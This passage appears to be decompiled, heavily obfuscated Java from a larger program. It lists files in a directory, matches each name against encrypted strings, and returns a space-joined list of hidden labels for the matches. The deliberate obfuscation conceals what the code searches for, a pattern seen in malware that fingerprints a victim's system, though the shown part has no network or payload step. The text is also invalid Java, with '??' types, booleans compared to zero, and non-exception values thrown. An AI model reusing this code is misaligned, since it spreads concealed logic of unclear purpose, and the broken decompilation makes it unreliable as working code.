        if ((boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, -6234950052116791700L, a3) /* invoke-custom */ && (a2 = (File[]) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(File[].class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a6, -6241301818678318302L, a3) /* invoke-custom */) != null) {
            for (File file : a2) {
                ?? B = (String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke((String) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(String.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(file, -6241125992707098078L, a3) /* invoke-custom */, -6218362224108799258L, a3) /* invoke-custom */;
                try {
                    ?? B2 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25254)), (-427419270) - (-((char) (-10291))), (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                    if (B2 != 0) {
                        (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25254)), (-427419270) - (-((char) (-10291))), (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                    } else {
                        try {
                            ?? B3 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25313)), 59014 - ((char) (-25336)), (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                            if (B3 != 0) {
                                (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25313)), 59014 - ((char) (-25336)), (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                            } else {
                                try {
                                    ?? B4 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25265)), (-427419270) - (-((char) (-16764))), (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                                    if (B4 != 0) {
                                        (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25265)), (-427419270) - (-((char) (-16764))), (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                                    } else {
                                        try {
                                            ?? B5 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25298)), (-427419270) - (-27367), (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                                            if (B5 != 0) {
                                                (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25298)), (-427419270) - (-27367), (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                                            } else {
                                                try {
                                                    ?? B6 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25276)), 427419270 - 31917, (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                                                    if (B6 != 0) {
                                                        (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25276)), 427419270 - 31917, (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                                                    } else {
                                                        try {
                                                            ?? B7 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25267)), (-427419270) - (-((char) (-17316))), (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                                                            if (B7 != 0) {
                                                                (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25267)), (-427419270) - (-((char) (-17316))), (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                                                            } else {
                                                                try {
                                                                    ?? B8 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B, m69a(59014 - ((char) (-25239)), 427419270 - 31130, (int) a3), -6219701426025248558L, a3) /* invoke-custom */;
                                                                    if (B8 != 0) {
                                                                        (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a4, m69a(59014 - ((char) (-25239)), 427419270 - 31130, (int) a3), -6239226043834429228L, a3) /* invoke-custom */, -6249745356142155838L, a3) /* invoke-custom */;
                                                                    }
                                                                } catch (RuntimeException unused) {
                                                                    throw B7;
                                                                }
                                                            }
                                                        } catch (RuntimeException unused2) {
                                                            throw B6;
                                                        }
                                                    }
                                                } catch (RuntimeException unused3) {
                                                    throw B5;
                                                }
                                            }
                                        } catch (RuntimeException unused4) {
                                            throw B4;
                                        }
                                    }
                                } catch (RuntimeException unused5) {
                                    throw B3;
                                }
                            }
                        } catch (RuntimeException unused6) {
                            throw B2;
                        }
                    }
                } catch (RuntimeException unused7) {
                    throw B;
                }
            }
        }
        List<String> a7 = new ArrayList<>();
        Iterator B9 = (Iterator) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Iterator.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a5, -6238744763017789521L, a3) /* invoke-custom */;
        while (true) {
            ?? B10 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B9, -6219659099128838922L, a3) /* invoke-custom */;
            if (B10 == 0) {
                try {
                    break;
                } catch (RuntimeException unused8) {
                    throw B10;
                }
            }
            ?? r0 = (String) (Object) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(B9, -6236660692255102629L, a3) /* invoke-custom */;
            try {
                ?? B11 = (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, r0, -6236745470737918518L, a3) /* invoke-custom */;
                if (B11 == 0) {
                    (boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, r0, -6249745356142155838L, a3) /* invoke-custom */;
                }
            } catch (RuntimeException unused9) {
                throw r0;
            }
        }
        if (!(boolean) C0003v.m40a(MethodHandles.lookup(), "B", MethodType.methodType(Boolean.TYPE, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(a7, -6241883696061032031L, a3) /* invoke-custom */) {
            return (String) C0003v.m40a(MethodHandles.lookup(), "î", MethodType.methodType(String.class, Object.class, Object.class, Long.TYPE, Long.TYPE)).dynamicInvoker().invoke(" ", a7, -6223533534204042250L, a3) /* invoke-custom */;
        }
        ?? m69a = m69a(59014 - ((char) (-25259)), (-427419270) - (-((char) (-30588))), (int) a3);
        return m69a;
    }
}
